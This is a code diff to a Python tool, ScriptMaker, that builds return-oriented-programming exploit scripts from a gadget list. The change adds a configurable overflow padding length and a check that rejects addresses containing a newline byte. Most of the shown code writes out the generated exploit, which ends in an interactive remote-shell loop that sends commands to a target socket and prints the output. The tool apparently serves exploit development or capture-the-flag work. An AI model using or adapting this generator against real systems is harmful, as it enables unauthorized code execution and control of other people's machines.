@@ -2,14 +2,26 @@
 from RopChainer import *
 from util import *
 
-class ScriptMaker(object):
-    tab = " " * 4 # set tab
+tab = " " * 4 # set tab
 
-    def __init__(self, gadget, pop_level=0):
+# check address whether contain bad char such as '\n'
+def check_address(addr):
+    return False if "\x0a" in p32(addr) else True
+
+def get_address(addrs):
+    for addr in addrs:
+        if check_address(addr):
+            return addr
+    return None
+
+class ScriptMaker(object):
+
+    def __init__(self, gadget,padding=0, pop_level=0):
         self.__Gadget = gadget
         self.__gadgets = self.__Gadget.getGadgets()
         self.chainer = RopChainer(self.__gadgets)
         self.prepare_gadgets()
+        self.padding = padding
         self.pop_level = pop_level
 
     def prepareHeader(self):
@@ -18,12 +30,8 @@ class ScriptMaker(object):
         Header += "import socket" + "\n"
         Header += "import sys" + "\n"
         Header += "\n"
-        #Header += "bin = pStr(\"/bin\") "+ "\n"
-        #Header += "sh  = pStr(\"/sh\") "+ "\n"
 
-        #Header += "padding  = \"A\" * 91" + "\n"
-        Header += "padding  = \"A\" * 99" + "\n"
-        #Header += "padding += p32(bin) + p32(sh)" + "\n"
+        Header += "padding  = \"A\" * " + str(self.padding) + "\n"
         Header += "\n"
         Header += "\n"
 
@@ -209,29 +217,29 @@ class ScriptMaker(object):
         self.exploit += "shHead = \"$ \"" + "\n"
         self.exploit += "\n"
         self.exploit += "while True:" + "\n"
-        self.exploit += self.tab + "try:" + "\n"
-        self.exploit += self.tab*2 + "command = raw_input(shHead)" + "\n"
-        self.exploit += self.tab*2 + "r.send(command+\"\\n\")" + "\n"
-        self.exploit += self.tab*2 + "l = 1" + "\n"
-        self.exploit += self.tab*2 + "response = \"\"" + "\n"
-        self.exploit += self.tab*2 + "recvLen = 1" + "\n"
-        self.exploit += self.tab*2 + "while recvLen:" + "\n"
-        self.exploit += self.tab*3 + "data = r.recv(4096)" + "\n"
-        self.exploit += self.tab*3 + "recvLen = len(data)" + "\n"
-        self.exploit += self.tab*3 + "response += data" + "\n"
-        self.exploit += self.tab*3 + "if recvLen < 4096:" + "\n"
-        self.exploit += self.tab*4 + "break" + "\n"
-        self.exploit += self.tab*2 + "if not response:" + "\n"
-        self.exploit += self.tab*3 + "continue" + "\n"
-        self.exploit += self.tab*2 + "print response" + "\n"
-        self.exploit += self.tab*1 + "except EOFError, KeyboardInterrupt:" + "\n"
-        self.exploit += self.tab*2 + "print" + "\n"
-        self.exploit += self.tab*2 + "print \"[+] Get EOF\"" + "\n"
-        self.exploit += self.tab*2 + "break" + "\n"
-        self.exploit += self.tab*1 + "except socket.timeout:" + "\n"
-        self.exploit += self.tab*2 + "continue" + "\n"
-        self.exploit += self.tab*1 + "except Exception as e:" + "\n"
-        self.exploit += self.tab*2 + "print str(e)" + "\n"
-        self.exploit += self.tab*2 + "r.close()" + "\n"
-        self.exploit += self.tab*2 + "break"
+        self.exploit += tab + "try:" + "\n"
+        self.exploit += tab*2 + "command = raw_input(shHead)" + "\n"
+        self.exploit += tab*2 + "r.send(command+\"\\n\")" + "\n"
+        self.exploit += tab*2 + "l = 1" + "\n"
+        self.exploit += tab*2 + "response = \"\"" + "\n"
+        self.exploit += tab*2 + "recvLen = 1" + "\n"
+        self.exploit += tab*2 + "while recvLen:" + "\n"
+        self.exploit += tab*3 + "data = r.recv(4096)" + "\n"
+        self.exploit += tab*3 + "recvLen = len(data)" + "\n"
+        self.exploit += tab*3 + "response += data" + "\n"
+        self.exploit += tab*3 + "if recvLen < 4096:" + "\n"
+        self.exploit += tab*4 + "break" + "\n"
+        self.exploit += tab*2 + "if not response:" + "\n"
+        self.exploit += tab*3 + "continue" + "\n"
+        self.exploit += tab*2 + "print response" + "\n"
+        self.exploit += tab*1 + "except EOFError, KeyboardInterrupt:" + "\n"
+        self.exploit += tab*2 + "print" + "\n"
+        self.exploit += tab*2 + "print \"[+] Get EOF\"" + "\n"
+        self.exploit += tab*2 + "break" + "\n"
+        self.exploit += tab*1 + "except socket.timeout:" + "\n"
+        self.exploit += tab*2 + "continue" + "\n"
+        self.exploit += tab*1 + "except Exception as e:" + "\n"
+        self.exploit += tab*2 + "print str(e)" + "\n"
+        self.exploit += tab*2 + "r.close()" + "\n"
+        self.exploit += tab*2 + "break"
         print self.exploit
